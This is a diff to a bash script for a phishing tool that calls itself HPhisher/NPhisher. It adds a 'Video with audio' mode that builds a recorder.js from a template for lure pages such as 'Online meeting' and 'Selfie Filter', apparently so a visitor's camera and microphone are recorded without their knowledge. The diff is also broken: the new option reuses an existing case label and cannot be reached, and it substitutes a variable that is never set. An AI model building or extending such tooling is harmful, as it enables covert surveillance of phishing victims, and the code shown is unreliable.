@@ -625,7 +625,7 @@ echo -e " "
 echo -e "${BLUE} [1] ${GREEN} Image ${NC}"
 echo -e "${BLUE} [2] ${GREEN} Audio ${NC}"
 echo -e "${BLUE} [3] ${GREEN} Video ${NC}"
-echo -e "${BLUE} [4] ${GREEN} Video+Audio ${NC}"
+echo -e "${BLUE} [4] ${GREEN} Video with audio ${NC}"
 echo -e " "
 echo -e "${BLUE} [A] ${RED} About ${NC}"
 echo -e "${BLUE} [B] ${RED} Request A site ${NC}"
@@ -646,9 +646,11 @@ case $reply_site in
 	3 | 03)
 		site_name=video
                 site_video;;
+	3 | 03)
+		site_name=video
+								site_video_audio;;
 	A | a)
 		xdg-open https://github.com/HPhisher/NPhisher
-		{ sleep 2; clear;  banner; mainmenu; };;
 	B | b | C | c)
 	  	xdg-open https://github.com/HPhisher/NPhisher/issues/new
 		{ sleep 2; clear; banner; mainmenu; };;
@@ -792,6 +794,7 @@ echo -e " "
 echo -e " "
 banner
 echo -e " "
+type=video
 duration=5000
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
 echo -e " "
@@ -819,9 +822,47 @@ case $reply_template in
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; banner; site_video; };;
 esac
-
+rm -rf ${sites_dir}/${site_name}/${site_template}/recorder.js
+sed "s+mediaType+"$type"+g" ${sites_dir}/${site_name}/${site_template}/template.js | sed "s+recordingTime+"$DURATION"+g" > ${sites_dir}/${site_name}/${site_template}/recorder.js
 }
 
+site_video_audio(){
+clear
+echo -e " "
+echo -e " "
+banner
+echo -e " "
+type=both
+duration=5000
+echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
+echo -e " "
+echo -e "${BLUE}[01]${CYAN} Default ${NC}"
+echo -e "${BLUE}[02]${CYAN} Online meeting ${NC}"
+echo -e "${BLUE}[03]${CYAN} Selfie Filter ${NC}"
+echo -e "${BLUE}[d]${RED} Change duration (default=${duration}) ${NC}"
+echo -e " "
+read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
+case $reply_template in
+        1 | 01)
+                site_template="default"
+                tunnel_menu;;
+	2 | 02)
+		site_template="onlinemeet"
+                tunnel_menu;;
+	3 | 03)
+		site_template="filter"
+		tunnel_menu;;
+	d | D)
+		echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Type your video duration : ${BLUE}"
+		read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" duration
+		site_video_audio;;
+        *)
+                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                { sleep 1; banner; site_video; };;
+esac
+rm -rf ${sites_dir}/${site_name}/${site_template}/recorder.js
+sed "s+mediaType+"$type"+g" ${sites_dir}/${site_name}/${site_template}/template.js | sed "s+recordingTime+"$DURATION"+g" > ${sites_dir}/${site_name}/${site_template}/recorder.js
+}
 
 clear
 cbanner
